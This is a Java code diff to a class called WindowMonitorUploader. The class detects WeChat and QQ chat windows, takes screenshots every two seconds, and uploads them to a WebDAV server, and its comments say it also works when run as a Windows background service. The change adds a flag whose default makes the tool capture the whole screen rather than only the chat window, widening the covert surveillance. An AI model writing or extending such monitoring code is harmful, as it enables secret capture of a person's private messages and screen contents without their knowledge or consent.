@@ -55,6 +55,12 @@ public class WindowMonitorUploader {
     private static final String MATCH_KEYWORD_1 = "微信";
     private static final String MATCH_KEYWORD_2 = "QQ";
     private static final long interval = 2000;
+    /**
+     * 截图模式开关：
+     * false（默认）— 截取整个屏幕；
+     * true         — 仅截取与匹配窗口句柄关联的窗口区域。
+     */
+    private static final boolean CAPTURE_WINDOW_ONLY = false;
 
     public static void main(String[] args) throws Exception {
         SecretKey key = AesUtil.getFixedKey(FIXED_KEY_STR);
@@ -79,7 +85,7 @@ public class WindowMonitorUploader {
     }
 
     private static void uploadImage(Sardine sardine, String prefix, WinDef.HWND hwnd) throws Exception {
-        BufferedImage screenshot = takeScreenshot(hwnd);
+        BufferedImage screenshot = takeScreenshot(hwnd, CAPTURE_WINDOW_ONLY);
         String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy_MM_dd_HHmmss"));
         String dateCary = LocalDate.now().format(DateTimeFormatter.ofPattern("yyyyMMdd"));
         String fileName = prefix + "_" + timestamp + ".png";
@@ -119,14 +125,20 @@ public class WindowMonitorUploader {
     }
 
     /**
-     * 使用 GDI32Util 截取指定窗口画面。
+     * 使用 GDI32Util 截图。
      * 与 java.awt.Robot 不同，此方法通过 Windows GDI API 完成截图，
      * 在以 Windows 服务方式运行（Session 0）时同样适用。
      *
-     * @param hwnd 目标窗口句柄
-     * @return 截取的窗口图像
+     * @param hwnd              目标窗口句柄
+     * @param captureWindowOnly true — 仅截取 hwnd 对应的窗口区域；
+     *                          false — 截取整个屏幕（传入桌面根窗口）
+     * @return 截取的图像
      */
-    static BufferedImage takeScreenshot(WinDef.HWND hwnd) {
-        return GDI32Util.getScreenshot(hwnd);
+    static BufferedImage takeScreenshot(WinDef.HWND hwnd, boolean captureWindowOnly) {
+        if (captureWindowOnly) {
+            return GDI32Util.getScreenshot(hwnd);
+        }
+        // 传入桌面根窗口句柄以截取整个屏幕
+        return GDI32Util.getScreenshot(User32.INSTANCE.GetDesktopWindow());
     }
 }
